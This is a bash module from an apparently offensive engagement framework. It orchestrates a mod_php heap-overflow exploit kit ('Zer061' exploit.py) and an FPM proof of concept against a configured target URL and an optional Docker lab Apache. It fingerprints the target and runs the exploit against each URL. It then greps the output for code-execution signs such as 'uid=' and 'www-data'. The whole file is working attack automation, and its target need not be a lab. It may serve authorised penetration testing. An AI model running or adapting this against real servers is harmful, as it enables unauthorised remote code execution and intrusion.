# shellcheck shell=bash
# mod_php heap chain (Zer061-style exploit.py) + FPM PoC coordination for engage.

modphp_apache_url() {
  if [[ -n "${ENGAGE_APACHE_URL:-}" ]]; then
    printf '%s' "$ENGAGE_APACHE_URL"
    return 0
  fi
  if engage_target_is_lab; then
    if [[ -n "${LAB_APACHE_URL:-}" ]]; then
      printf '%s' "$LAB_APACHE_URL"
      return 0
    fi
    local lib="$LAB_ROOT/scripts/lib/lab-apache-url.sh"
    if [[ -f "$lib" ]]; then
      # shellcheck source=scripts/lib/lab-apache-url.sh
      source "$lib"
      lab_apache_resolve_url 2>/dev/null || lab_apache_host_url
      return 0
    fi
    printf '%s' "http://127.0.0.1:19288/index.php"
    return 0
  fi
  printf '%s' "$TARGET_URL"
}

modphp_enabled() {
  [[ "${ENGAGE_MODPHP:-auto}" != "off" ]]
}

modphp_banner_suggests_apache() {
  local b="${1:-}"
  grep -qiE 'apache|mod_php' <<<"$b"
}

# modphp_fingerprint_extras — append to phase 20 log (zer061-heap probe).
modphp_fingerprint_extras() {
  local log="$1" audit="$LAB_ROOT/attacker/scripts/patch_audit.py" proxy="$2"
  modphp_enabled || return 0
  [[ ! -f "$audit" ]] && return 0
  local apache_url; apache_url="$(modphp_apache_url)"
  echo "== mod_php fingerprint: zer061-heap → $apache_url ==" >>"$log"
  PATCH_AUDIT_URL="$TARGET_URL" \
  PATCH_AUDIT_APACHE_URL="$apache_url" \
  PATCH_AUDIT_PROXY="$proxy" \
  PATCH_AUDIT_LOG="$ENGAGE_DIR/logs/patch-audit.jsonl" \
    python3 "$audit" run zer061-heap >>"$log" 2>&1 || true
  local zh
  zh="$(grep -E 'zer061-heap' "$log" | grep -oE '\[(PASS|FAIL|WARN|SKIP|INFO) ?\]' | tail -1 | tr -d '[] ' || true)"
  state_set 20 MODPHP_HEAP "${zh:-UNKNOWN}"
}

# modphp_run_exploit — phase 30 mod_php + PoC block.
modphp_run_exploit() {
  local log="$1"
  if ! modphp_enabled; then
    echo "== mod_php + PoC skipped (ENGAGE_MODPHP=off) ==" >>"$log"
    state_set 30 MODPHP "off"
    return 0
  fi

  local kit; kit="$(kit_zer061)"
  if [[ ! -f "$kit" ]]; then
    echo "== mod_php + PoC: Zer061 kit fehlt — fetch-zer061 ==" >>"$log"
    state_set 30 MODPHP "missing-kit"
    state_set 30 ZER061 "missing"
    return 0
  fi

  local -a urls=()
  urls+=("$TARGET_URL")
  local au; au="$(modphp_apache_url)"
  if [[ "$au" != "$TARGET_URL" ]]; then
    urls+=("$au")
  fi

  local ran=0 u
  for u in "${urls[@]}"; do
    echo "== mod_php + PoC (heap exploit.py) → $u ==" >>"$log"
    if python3 "$kit" -u "$u" >>"$log" 2>&1; then
      ran=1
    else
      echo "(exit non-zero — siehe Log)" >>"$log"
      ran=1
    fi
  done

  # Lab: optional lokales Apache-Target hochziehen und nochmal gegen :19288
  if [[ "${ENGAGE_MODPHP_LAB:-auto}" != "off" ]] && engage_target_is_lab && command -v docker >/dev/null; then
    echo "== mod_php lab: apache-up (Docker) + PoC :19288 ==" >>"$log"
    if bash "$LAB_ROOT/scripts/lab-apache-up.sh" >>"$log" 2>&1; then
      local lab_u="${LAB_APACHE_URL:-}"
      [[ -z "$lab_u" ]] && lab_u="$(modphp_apache_url)"
      echo "== mod_php + PoC (lab apache) → $lab_u ==" >>"$log"
      python3 "$kit" -u "$lab_u" >>"$log" 2>&1 || true
      ran=1
      state_set 30 MODPHP_LAB "apache-up"
    else
      state_set 30 MODPHP_LAB "apache-up-failed"
    fi
  fi

  state_set 30 ZER061 "ran"
  if grep -qE 'PROOF:|uid=|www-data|BLIND_OK' "$log"; then
    state_set 30 MODPHP "proof-or-signal"
  elif [[ $ran -eq 1 ]]; then
    state_set 30 MODPHP "ran"
  else
    state_set 30 MODPHP "no-run"
  fi
}
